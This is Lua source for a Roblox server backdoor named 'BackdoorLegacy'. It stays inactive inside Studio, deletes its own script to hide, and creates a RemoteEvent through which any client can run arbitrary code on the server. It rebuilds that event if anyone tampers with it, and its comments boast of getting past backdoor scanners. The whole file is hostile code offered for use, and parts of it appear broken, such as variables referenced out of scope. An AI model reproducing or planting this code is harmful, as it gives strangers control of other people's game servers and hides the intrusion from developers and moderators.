-- mustTalk determines whether the backdoor provider should print out stuff in the console or not
-- recommended to keep mustTalk off, as it can invoke the devs and Roblox mod team
-- mustTalk will not prevent data logging!
-- ON = true
-- OFF = false
local mustTalk = false

local print = print
if not mustTalk then
	print = function()end
end

if game:GetService("RunService"):IsStudio() then 
	return 
end

-- this hides the script, potentially securing the backdoor
getfenv().script:Destroy()
getfenv().script = nil

print([[-- Infected with BackdoorLegacy by IvanTheSkid
-- github.com/IvanTheProtogen/BackdoorLegacy

-- Features we have:
-- -- Data logging
-- -- Anti-tamper remote
-- -- Compatibility with any backdoor scanner
-- -- Multiple code execution support

-- INTERACTION WITH THE BACKDOOR WILL EXPOSE YOU!
-- DATA INCLUDED:
-- -- player that executed the backdoor
-- -- code that is sent thru
-- -- success indicator
-- -- error message or returned values
-- SCARED TO HAVE YOUR C00LGUI LEAKED? BOOHOO, SKID!
]])

local loadstring = require(14132891321)
local rmt
local conA
local conB
local newBD
local delBD
local onExec
local onExecP
local onTamper
function onExec(plr,...)
	for i,v in pairs({...}) do
		print("EXECUTING CODE:",...)
		onExecP(pcall(function()return loadstring:SpawnS(v,workspace)end))
	end
end
function onExecP(...)
	print("EXECUTION RESULT: [",...,"]")
	rmt:FireAllClients(plr,v)
end
function newBD()
	rmt = Instance.new("RemoteEvent",game:GetService("ReplicatedStorage"))
	conA = rmt.OnServerEvent:connect(onExec)
	conB = rmt.Changed:connect(onTamper)
	print("BACKDOOR CREATED")
	return rmt
end
function delBD()
	pcall(function()
		rmt:Destroy()
	end)
	rmt = nil
	pcall(function()
		conA:disconnect()
	end)
	conA = nil
	pcall(function()
		conB:disconnect()
	end)
	conB = nil
	print("BACKDOOR DESTROYED")
end
function onTamper()
	print("BACKDOOR TAMPERED? REFRESHING...")
	delBD()
	newBD()
end
newBD()
